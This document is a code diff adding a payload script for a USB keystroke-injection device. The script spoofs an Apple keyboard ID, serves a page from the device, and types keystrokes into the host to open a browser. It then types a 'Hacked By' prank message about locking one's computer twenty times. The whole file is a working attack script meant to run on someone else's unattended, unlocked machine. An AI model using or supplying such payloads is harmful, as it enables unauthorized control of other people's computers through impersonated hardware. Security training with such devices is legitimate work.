@@ -1,0 +1,66 @@
+#!bin/bash
+
+CUCUMBER PLAID
+
+LED SETUP
+GET HOST_IP
+GET SWITCH_POSITION
+ATTACKMODE HID ECM_ETHERNET VID_0x05ac PID_0x021e
+
+MESSAGE="I Will learn to lock my computer"
+HEADER="Write the following 20 times: ${MESSAGE}"
+HACKER_NAME="Mr. Robot's Son"
+FINALE="Understand now?"
+
+LED SPECIAL
+
+cd /root/udisk/payloads/$SWITCH_POSITION
+iptables -A OUTPUT -p udp --dport 80 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening (credit audibleblink)
+while ! nc -z localhost 80; do sleep 0.2; done
+
+LED ATTACK
+Q GUI
+Q DELAY 5000
+Q STRING "http://${HOST_IP}/index.html"
+Q DELAY 750
+Q ENTER
+Q DELAY 10000
+Q CONTROL R
+Q DELAY 10000
+Q STRING "${HEADER}"
+Q ENTER
+Q ENTER
+
+i="0"
+while [ $i -lt 19 ]; do
+Q STRING "${MESSAGE}"
+Q DELAY 100
+Q ENTER
+i=$[$i+1]
+Q DELAY 200
+done
+
+Q ENTER
+
+Q STRING "${FINALE}"
+Q ENTER
+Q STRING "Hacked By: ${HACKER_NAME}"
+Q ENTER
+
+LED CLEANUP
+i="0"
+while [ $i -lt 30 ]; do
+Q UP
+i=$[$i+1]
+Q DELAY 100
+done
+
+LED W 100
+sync
+sleep 3
+sync
+
+LED FINISH
